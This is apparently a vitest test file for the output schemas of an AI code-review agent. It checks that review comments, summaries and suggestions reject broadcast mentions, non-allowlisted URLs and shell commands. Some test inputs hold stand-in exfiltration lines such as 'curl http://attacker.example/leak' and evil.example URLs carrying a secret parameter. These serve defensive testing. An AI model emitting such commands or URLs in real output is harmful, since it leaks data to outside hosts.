import { describe, expect, it } from 'vitest';
import {
  createReviewOutputSchema,
  InlineCommentSchema,
  REVIEW_STATE_SCHEMA_VERSION,
  ReviewStateSchema,
} from './schemas.js';

// Default factory args used by tests that don't care about URL
// allowlist behavior — they exercise the base shape / per-comment
// refines. URL-allowlist-specific tests build their own factory
// instance with the inputs they want to exercise.
const DEFAULT_OPTS = {
  allowedUrlPrefixes: [],
  prRepo: { host: 'github.com', owner: 'owner', repo: 'repo' },
} as const;
const ReviewOutputSchema = createReviewOutputSchema(DEFAULT_OPTS);

const validComment = {
  path: 'src/auth.ts',
  line: 10,
  side: 'RIGHT' as const,
  body: 'Avoid logging secrets. Use a redaction layer instead.',
  severity: 'major' as const,
  suggestion: 'logger.info({ user: user.id });',
};

describe('InlineCommentSchema', () => {
  it('accepts a well-formed comment', () => {
    expect(InlineCommentSchema.safeParse(validComment).success).toBe(true);
  });

  it('accepts comment without suggestion', () => {
    const { suggestion: _, ...withoutSuggestion } = validComment;
    expect(InlineCommentSchema.safeParse(withoutSuggestion).success).toBe(true);
  });

  it('rejects null suggestion (must be omitted, not null)', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, suggestion: null }).success).toBe(
      false,
    );
  });

  it('rejects non-positive line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 0 }).success).toBe(false);
    expect(InlineCommentSchema.safeParse({ ...validComment, line: -1 }).success).toBe(false);
  });

  it('rejects fractional line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 1.5 }).success).toBe(false);
  });

  it('rejects line numbers above 1_000_000', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 1_000_001 }).success).toBe(false);
  });

  it('rejects unknown side value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, side: 'CENTER' }).success).toBe(false);
  });

  it('rejects unknown severity value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, severity: 'blocker' }).success).toBe(
      false,
    );
  });

  it('rejects empty body', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, body: '' }).success).toBe(false);
  });

  it('rejects oversized body (>5000 chars)', () => {
    const huge = 'x'.repeat(5001);
    expect(InlineCommentSchema.safeParse({ ...validComment, body: huge }).success).toBe(false);
  });

  it('rejects path containing NUL byte', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: 'src/a\0.ts' }).success).toBe(
      false,
    );
  });

  it('rejects path > 500 chars', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: 'a'.repeat(501) }).success).toBe(
      false,
    );
  });

  it('rejects @everyone broadcast mention', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'Hey @everyone please look' }).success,
    ).toBe(false);
  });

  it('rejects @channel broadcast mention', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'Notify @channel about this' })
        .success,
    ).toBe(false);
  });

  it('rejects shell command (curl http) in body', () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        body: 'Run `curl http://attacker.example/leak`',
      }).success,
    ).toBe(false);
  });

  it('allows mentions of regular users', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'cc @alice — thoughts?' }).success,
    ).toBe(true);
  });

  it('allows curl mentioned without an HTTP URL', () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        body: 'Use curl to test this endpoint locally.',
      }).success,
    ).toBe(true);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, extra: 'oops' }).success).toBe(false);
  });

  it('rejects empty path', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: '' }).success).toBe(false);
  });

  it('rejects oversized suggestion (>5000 chars)', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, suggestion: 'x'.repeat(5001) }).success,
    ).toBe(false);
  });

  it('accepts comment without category (optional)', () => {
    const { category: _, ...withoutCategory } = { ...validComment, category: undefined };
    expect(InlineCommentSchema.safeParse(withoutCategory).success).toBe(true);
  });

  it('accepts each known category value', () => {
    for (const category of [
      'bug',
      'security',
      'performance',
      'maintainability',
      'style',
      'docs',
      'test',
    ] as const) {
      const severity = category === 'style' ? 'minor' : 'major';
      expect(InlineCommentSchema.safeParse({ ...validComment, severity, category }).success).toBe(
        true,
      );
    }
  });

  it('rejects unknown category value', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'correctness' }).success,
    ).toBe(false);
  });

  it("rejects category='style' with severity='major'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'major' })
        .success,
    ).toBe(false);
  });

  it("rejects category='style' with severity='critical'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'critical' })
        .success,
    ).toBe(false);
  });

  it("accepts category='style' with severity='minor'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'minor' })
        .success,
    ).toBe(true);
  });

  it("accepts category='style' with severity='info'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'info' })
        .success,
    ).toBe(true);
  });

  it("accepts category='security' with severity='critical' (no cap on non-style)", () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        category: 'security',
        severity: 'critical',
      }).success,
    ).toBe(true);
  });

  it('accepts comment without confidence (optional)', () => {
    expect(InlineCommentSchema.safeParse(validComment).success).toBe(true);
  });

  it("accepts each confidence value ('high', 'medium', 'low')", () => {
    for (const confidence of ['high', 'medium', 'low'] as const) {
      expect(InlineCommentSchema.safeParse({ ...validComment, confidence }).success).toBe(true);
    }
  });

  it('rejects unknown confidence value', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, confidence: 'very-high' }).success,
    ).toBe(false);
  });

  it('accepts comment without ruleId (optional)', () => {
    expect(InlineCommentSchema.safeParse(validComment).success).toBe(true);
  });

  it('accepts a well-formed ruleId', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, ruleId: 'sql-injection' }).success,
    ).toBe(true);
    expect(InlineCommentSchema.safeParse({ ...validComment, ruleId: 'unused-var' }).success).toBe(
      true,
    );
    expect(InlineCommentSchema.safeParse({ ...validComment, ruleId: 'null-deref-2' }).success).toBe(
      true,
    );
  });

  it('rejects ruleId not matching /^[a-z][a-z0-9-]+$/', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, ruleId: 'SQL-INJECTION' }).success,
    ).toBe(false);
    expect(
      InlineCommentSchema.safeParse({ ...validComment, ruleId: '1-leading-digit' }).success,
    ).toBe(false);
    expect(
      InlineCommentSchema.safeParse({ ...validComment, ruleId: 'has_underscore' }).success,
    ).toBe(false);
    expect(InlineCommentSchema.safeParse({ ...validComment, ruleId: 'has space' }).success).toBe(
      false,
    );
  });

  it('rejects single-character ruleId (length min)', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, ruleId: 'a' }).success).toBe(false);
  });

  it('rejects ruleId longer than 64 chars', () => {
    const tooLong = `r${'a'.repeat(64)}`;
    expect(InlineCommentSchema.safeParse({ ...validComment, ruleId: tooLong }).success).toBe(false);
  });

  it('accepts ruleId at the 64-char boundary', () => {
    const exact = `r${'a'.repeat(63)}`;
    expect(InlineCommentSchema.safeParse({ ...validComment, ruleId: exact }).success).toBe(true);
  });
});

describe('createReviewOutputSchema', () => {
  it('accepts valid output with empty comments', () => {
    expect(ReviewOutputSchema.safeParse({ summary: 'No issues.', comments: [] }).success).toBe(
      true,
    );
  });

  it('accepts valid output with multiple comments', () => {
    expect(
      ReviewOutputSchema.safeParse({
        summary: 'Two issues identified.',
        comments: [validComment, { ...validComment, line: 20 }],
      }).success,
    ).toBe(true);
  });

  it('rejects empty summary', () => {
    expect(ReviewOutputSchema.safeParse({ summary: '', comments: [] }).success).toBe(false);
  });

  it('rejects oversized summary (>10000 chars)', () => {
    expect(
      ReviewOutputSchema.safeParse({ summary: 'x'.repeat(10_001), comments: [] }).success,
    ).toBe(false);
  });

  it('rejects more than 50 comments', () => {
    const many = Array.from({ length: 51 }, (_, i) => ({ ...validComment, line: i + 1 }));
    expect(ReviewOutputSchema.safeParse({ summary: 'Too many', comments: many }).success).toBe(
      false,
    );
  });

  it('accepts exactly 50 comments', () => {
    const fifty = Array.from({ length: 50 }, (_, i) => ({ ...validComment, line: i + 1 }));
    expect(ReviewOutputSchema.safeParse({ summary: 'OK', comments: fifty }).success).toBe(true);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(
      ReviewOutputSchema.safeParse({ summary: 'ok', comments: [], extra: 'nope' }).success,
    ).toBe(false);
  });

  it('propagates per-comment validation failures', () => {
    expect(
      ReviewOutputSchema.safeParse({
        summary: 'ok',
        comments: [{ ...validComment, body: '@everyone' }],
      }).success,
    ).toBe(false);
  });

  describe('URL allowlist', () => {
    it("always permits URLs into the PR's own repo, even with an empty allowlist", () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      expect(
        schema.safeParse({
          summary: 'See https://github.com/almondoo/review-agent/pull/42 for context.',
          comments: [
            {
              ...validComment,
              body: 'Related: https://github.com/almondoo/review-agent/issues/7',
            },
          ],
        }).success,
      ).toBe(true);
    });

    it('permits URLs whose prefix is in `allowedUrlPrefixes`', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: ['https://docs.example.com/'],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      expect(
        schema.safeParse({
          summary: 'docs: https://docs.example.com/zod/refine',
          comments: [{ ...validComment, body: 'Cite https://docs.example.com/api#section' }],
        }).success,
      ).toBe(true);
    });

    it('rejects a comment body URL that is neither own-repo nor allowlisted', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: ['https://docs.example.com/'],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: 'No issues.',
        comments: [{ ...validComment, body: 'See https://attacker.example/leak for details.' }],
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        const message = result.error.issues[0]?.message ?? '';
        // The message format embeds both the offending URL and a hint
        // listing the expected host + allowlist entry, so operators can
        // diagnose without re-running with a debugger.
        expect(message).toContain('URL not in allowlist: https://attacker.example/leak');
        expect(message).toContain("expected host 'github.com'");
        expect(result.error.issues[0]?.path).toEqual(['comments', 0, 'body']);
      }
    });

    it('rejects a summary URL that is neither own-repo nor allowlisted', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: 'Read more at https://attacker.example/exfil',
        comments: [],
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0]?.path).toEqual(['summary']);
      }
    });

    it('rejects when any one URL among several fails the allowlist (closed world)', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: ['https://docs.example.com/'],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: [
          'Good: https://docs.example.com/a',
          'Own repo: https://github.com/almondoo/review-agent/blob/main/README.md',
          'Bad: https://attacker.example/x',
        ].join(' '),
        comments: [],
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues).toHaveLength(1);
        expect(result.error.issues[0]?.message).toContain(
          'URL not in allowlist: https://attacker.example/x',
        );
      }
    });

    // Schema-level regression for reviewer C-2: a URL with the same
    // owner/repo path but a foreign host must NOT be treated as the
    // PR's own repo (otherwise it becomes a one-click exfil channel).
    it("rejects a same-path / foreign-host URL (does not treat it as PR's own repo)", () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: 'No issues.',
        comments: [
          {
            ...validComment,
            body: 'context: https://evil.example/almondoo/review-agent/log?secret=abc',
          },
        ],
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0]?.message).toContain(
          'URL not in allowlist: https://evil.example/almondoo/review-agent/log?secret=abc',
        );
      }
    });

    // Reviewer I-1: GitHub's Apply-suggestion button copies the
    // `suggestion` body verbatim into source. A bad URL there is a
    // one-click path to persisting exfiltration. The schema must
    // catch it in the same closed-world refine as body / summary.
    it('rejects a bad URL in the `suggestion` field', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: 'No issues.',
        comments: [
          {
            ...validComment,
            suggestion: '// see https://attacker.example/leak for details\nlogger.info()',
          },
        ],
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0]?.path).toEqual(['comments', 0, 'suggestion']);
        expect(result.error.issues[0]?.message).toContain(
          'URL not in allowlist: https://attacker.example/leak',
        );
      }
    });

    it('accepts a suggestion containing an own-repo URL', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      expect(
        schema.safeParse({
          summary: 'OK.',
          comments: [
            {
              ...validComment,
              suggestion: '// see https://github.com/almondoo/review-agent/blob/main/AUTHORS\nx()',
            },
          ],
        }).success,
      ).toBe(true);
    });

    // Cross-field coverage: a single payload with one bad URL in body
    // AND a different bad URL in summary must surface BOTH issues so
    // the operator sees the full violation list, not just the first.
    it('reports separate issues when body and summary each contain a bad URL', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: 'context: https://evil.example/summary-leak',
        comments: [{ ...validComment, body: 'see https://evil.example/body-leak' }],
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        const paths = result.error.issues.map((i) => i.path);
        expect(paths).toContainEqual(['comments', 0, 'body']);
        expect(paths).toContainEqual(['summary']);
      }
    });

    // T1↔T2 connection regression: the URL allowlist refine relies on
    // T1's `extractUrls` matching mixed-case schemes. If that ever
    // regresses, a payload like `HTTPS://evil.example/x` would slip
    // past the schema entirely. Verify end-to-end at the schema level.
    it('rejects a mixed-case-scheme bad URL (T1 case-insensitive scheme integration)', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: 'see HTTPS://evil.example/x for context',
        comments: [],
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0]?.message).toContain('HTTPS://evil.example/x');
      }
    });

    // Boundary regression for `isPrOwnRepoUrl`: a path-traversal
    // sequence like `/owner/repo/../leak` resolves under the same
    // host but `URL.pathname` normalizes it to `/owner/leak`, so the
    // own-repo prefix check no longer matches and the URL is
    // rejected. Codifies the desired behavior so a future
    // refactor (e.g. removing `URL` normalization) is caught.
    it('rejects an own-host URL whose normalized path escapes the repo via `..`', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      const result = schema.safeParse({
        summary: 'see https://github.com/almondoo/review-agent/../leak',
        comments: [],
      });
      expect(result.success).toBe(false);
    });

    it('accepts output with no URLs at all regardless of allowlist policy', () => {
      const schema = createReviewOutputSchema({
        allowedUrlPrefixes: [],
        prRepo: { host: 'github.com', owner: 'almondoo', repo: 'review-agent' },
      });
      expect(
        schema.safeParse({
          summary: 'Looks good.',
          comments: [{ ...validComment, body: 'Plain prose with no links.' }],
        }).success,
      ).toBe(true);
    });
  });
});

const validState = {
  schemaVersion: REVIEW_STATE_SCHEMA_VERSION,
  lastReviewedSha: '0123456789abcdef0123456789abcdef01234567',
  baseSha: 'fedcba9876543210fedcba9876543210fedcba98',
  reviewedAt: '2026-04-30T10:00:00.000Z',
  modelUsed: 'claude-sonnet-4-6',
  totalTokens: 12_345,
  totalCostUsd: 0.45,
  commentFingerprints: ['0123456789abcdef', 'fedcba9876543210'],
};

describe('ReviewStateSchema', () => {
  it('accepts a well-formed state', () => {
    expect(ReviewStateSchema.safeParse(validState).success).toBe(true);
  });

  it('accepts state with empty commentFingerprints array', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, commentFingerprints: [] }).success).toBe(
      true,
    );
  });

  it('rejects negative totalCostUsd', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, totalCostUsd: -0.01 }).success).toBe(false);
  });

  it('rejects negative totalTokens', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, totalTokens: -1 }).success).toBe(false);
  });

  it('rejects fractional totalTokens', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, totalTokens: 1.5 }).success).toBe(false);
  });

  it('rejects lastReviewedSha that is not a 40-char hex SHA', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, lastReviewedSha: 'abc' }).success).toBe(
      false,
    );
    expect(
      ReviewStateSchema.safeParse({
        ...validState,
        lastReviewedSha: 'GHIJKL6789abcdef0123456789abcdef01234567',
      }).success,
    ).toBe(false);
    expect(
      ReviewStateSchema.safeParse({
        ...validState,
        lastReviewedSha: '0123456789ABCDEF0123456789ABCDEF01234567',
      }).success,
    ).toBe(false);
  });

  it('rejects baseSha that is not a 40-char hex SHA', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, baseSha: 'def' }).success).toBe(false);
  });

  it('rejects schemaVersion mismatch (future v2)', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, schemaVersion: 2 }).success).toBe(false);
  });

  it('rejects schemaVersion as a non-numeric type', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, schemaVersion: '1' }).success).toBe(false);
  });

  it('rejects missing commentFingerprints', () => {
    const { commentFingerprints: _, ...withoutFingerprints } = validState;
    expect(ReviewStateSchema.safeParse(withoutFingerprints).success).toBe(false);
  });

  it('rejects commentFingerprints with the wrong shape', () => {
    expect(
      ReviewStateSchema.safeParse({ ...validState, commentFingerprints: ['short'] }).success,
    ).toBe(false);
    expect(
      ReviewStateSchema.safeParse({
        ...validState,
        commentFingerprints: ['0123456789ABCDEF'],
      }).success,
    ).toBe(false);
    expect(ReviewStateSchema.safeParse({ ...validState, commentFingerprints: [42] }).success).toBe(
      false,
    );
  });

  it('rejects non-ISO reviewedAt strings', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, reviewedAt: 'yesterday' }).success).toBe(
      false,
    );
  });

  it('rejects empty modelUsed', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, modelUsed: '' }).success).toBe(false);
  });

  it('rejects modelUsed longer than 128 chars', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, modelUsed: 'm'.repeat(129) }).success).toBe(
      false,
    );
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, extra: 'oops' }).success).toBe(false);
  });
});
